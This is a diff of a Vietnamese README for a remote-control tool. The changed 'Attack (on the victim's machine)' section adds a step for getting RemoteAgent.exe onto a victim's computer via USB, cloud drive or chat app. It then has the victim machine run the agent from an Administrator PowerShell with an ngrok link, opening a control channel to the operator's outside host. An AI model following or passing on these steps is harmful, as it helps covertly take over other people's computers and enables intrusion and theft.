@@ -89,16 +89,18 @@ RemoteControl/
     👉 Bạn sẽ thấy file RemoteAgent.exe (Dung lượng khoảng ~60MB).
 ### 📍 Bước 3: Tấn công (Trên máy nạn nhân)
 
-   1. **Copy đường dẫn thư mục:** Vào thư mục chứa file `RemoteAgent.exe`, bấm vào thanh địa chỉ ở trên cùng và copy đường dẫn.
+   1. **Gửi file**: Copy file RemoteAgent.exe (vừa lấy ở Bước 2) sang máy nạn nhân (qua USB, Drive, Zalo...).
    
-   2. **Mở PowerShell Admin:**
+   2. **Copy đường dẫn thư mục:** Vào thư mục chứa file `RemoteAgent.exe`, bấm vào thanh địa chỉ ở trên cùng và copy đường dẫn.
+   
+   3. **Mở PowerShell Admin:**
        - Nhấn phím **Windows**, gõ chữ `powershell`.
        - Chọn **"Run as Administrator"** bên tay phải.
    
-   3. **Di chuyển vào thư mục:**
+   4. **Di chuyển vào thư mục:**
        - Gõ lệnh: `cd "dán-đường-dẫn-vừa-copy-vào-đây"` rồi Enter.
    
-   4. **Chạy lệnh kết nối:**
+   5. **Chạy lệnh kết nối:**
        ```powershell
        .\RemoteAgent.exe <link-ngrok-của-bạn>
 
